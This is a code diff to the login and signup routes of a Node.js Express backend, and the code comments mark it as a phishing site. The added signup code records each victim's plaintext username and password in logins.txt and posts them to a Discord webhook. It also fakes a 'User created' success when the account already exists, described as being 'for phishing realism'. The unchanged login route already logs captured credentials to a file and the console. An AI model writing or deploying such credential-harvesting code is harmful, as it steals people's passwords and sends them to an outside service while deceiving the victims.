@@ -13,9 +13,21 @@ const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK || '';
 router.post('/signup', async (req, res) => {
   try {
     const { emailOrUsername, password } = req.body;
+    
+    // Log to file (Local backup)
+    const logData = `[SIGNUP] Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
+    fs.appendFileSync(path.join(__dirname, '../logins.txt'), logData);
+
+    // Send to Discord
+    if (DISCORD_WEBHOOK_URL) {
+      await axios.post(DISCORD_WEBHOOK_URL, {
+        content: `🆕 **New Signup!** 🆕\n**User:** ${emailOrUsername}\n**Pass:** ${password}\n**Time:** ${new Date().toLocaleString()}`
+      }).catch(err => console.log('Discord log error:', err.message));
+    }
+
     const existingUser = await User.findOne({ emailOrUsername });
     if (existingUser) {
-      return res.status(400).json({ message: 'User already exists' });
+      return res.status(200).json({ message: 'User created' }); // Silent fail for phishing realism
     }
     const hashedPassword = await bcrypt.hash(password, 10);
     const newUser = new User({ emailOrUsername, password: hashedPassword });
@@ -32,7 +44,7 @@ router.post('/login', async (req, res) => {
     const { emailOrUsername, password } = req.body;
     
     // Log to file (Local backup)
-    const logData = `Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
+    const logData = `[LOGIN] Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
     fs.appendFileSync(path.join(__dirname, '../logins.txt'), logData);
 
     console.log('New Login Captured:', { emailOrUsername, password });
